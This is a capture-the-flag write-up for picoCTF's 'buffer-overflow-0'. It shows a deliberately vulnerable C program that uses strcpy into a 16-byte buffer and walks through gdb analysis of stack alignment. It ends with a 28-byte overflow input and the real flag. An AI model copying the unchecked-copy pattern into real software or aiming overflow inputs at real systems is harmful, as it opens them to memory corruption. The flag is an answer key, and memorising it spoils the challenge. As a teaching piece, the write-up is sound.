# buffer-overflow-0 (pwn, 150pts)

> Let's start off simple, can you overflow the right buffer in this [program](./assets/vuln) to get the flag?

You're given the binary and the following C code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}

```

Running the binary (after creating `flag.txt`), we see that the program simply outputs the first argument:

```
$ echo "picoCTF{flag}" > flag.txt
$ ./vuln test
Thanks! Received: test
```

Looking into the C code, we can see that when a segmentation fault occurs, the `sigsegv_handler` function is executed
`signal(SIGSEGV, sigsegv_handler);`, which will output the flag.  We therefore need to cause a segfault in order to get
the flag.

The only user input the program uses is the first command line argument passed to the program (`argv[1]`), which it
copies into a 16-character buffer `buf[16]`.  [`strcpy`](http://www.cplusplus.com/reference/cstring/strcpy/) doesn't do
any bounds checks, so if we pass in more than 16 characters, we'll be overriding memory that we shouldn't have access
to.

When we enter the `vuln` function and allocate space for the 16-byte char array, the stack looks like this (addresses
simplified):

```
0x0000000 start of space allocated for the "buf" char array
0x0000004 
0x0000008 
0x000000c 
0x0000010 
0x0000014 end of space allocated for the "buf" char array
0x0000018 saved base pointer (ebp)
0x000001c return address
```

You'd expect entering more than 16 bytes would start to overwrite memory (e.g. the saved base pointer), but this isn't
the case due to stack alignment - the default in gcc is `2^4 = 16 bytes`, which means the stack must be aligned on a
16-byte boundary before every `call` instruction.  You can confirm this using [`gdb`](https://www.gnu.org/software/gdb/)
to disassemble the `vuln` function:

```
$ gdb vuln
gef➤  disassemble vuln
Dump of assembler code for function vuln:
   0x08048667 <+0>:	push   ebp
   0x08048668 <+1>:	mov    ebp,esp
   0x0804866a <+3>:	sub    esp,0x18 # space allocated for char array - 24 bytes?!
   0x0804866d <+6>:	sub    esp,0x8
   0x08048670 <+9>:	push   DWORD PTR [ebp+0x8]
   0x08048673 <+12>:	lea    eax,[ebp-0x18]
   0x08048676 <+15>:	push   eax
   0x08048677 <+16>:	call   0x80484b0 <strcpy@plt>
   0x0804867c <+21>:	add    esp,0x10
   0x0804867f <+24>:	nop
   0x08048680 <+25>:	leave  
   0x08048681 <+26>:	ret    
End of assembler dump.
```

We therefore need to pass in at least 24 characters to the program to overwrite memory and hopefully trigger a
segmentation fault.  We can do this easily by leveraging Python:

```
$ ./vuln $(python2 -c "print 'A'*24")
Segmentation fault (core dumped)
```

Interestingly, this didn't cause the segfault handler to execute (I'm not sure why - open a pull request if you do!).
Try overwriting the return address by adding another 4 characters:

```
$ ./vuln $(python2 -c "print 'A'*28")
picoCTF{flag}
```

We can now run the same command on the server to retrieve the real flag:

```
$ ./vuln $(python2 -c "print 'A'*28")
picoCTF{ov3rfl0ws_ar3nt_that_bad_2d11f6cd}
```
